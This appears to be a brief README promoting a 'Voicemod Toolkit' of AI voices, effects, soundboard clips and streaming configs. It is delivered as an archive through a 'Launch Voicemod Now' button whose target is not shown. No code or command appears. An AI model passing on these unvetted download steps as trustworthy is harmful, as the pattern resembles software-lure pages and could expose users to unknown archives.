## About

**Voicemod Toolkit** gives you instant access to professional voice assets. Activate **AI voices**, **real-time effects**, **soundboard clips**, load **custom packs**, and use **app configs** — all in one click.

---

## What's included

- `modules/` — AI Voices, Soundboard, Effects (WAV/JSON)
- `configs/` — Discord, OBS, Streamlabs profiles
- `presets/` — Gaming, Streaming, Roleplay packs
- `guides/` — 30-second setup, Apple Silicon tips
- `assets/` — GUI themes, voice previews

## Download & install (archive delivery)

1. Click **Launch Voicemod Now**
2. Extract to `~/Applications/Voicemod-Toolkit`.
3. Import into Voicemod → voices auto-load.
> Pro tip: Use 48kHz for best M1/M4 performance.
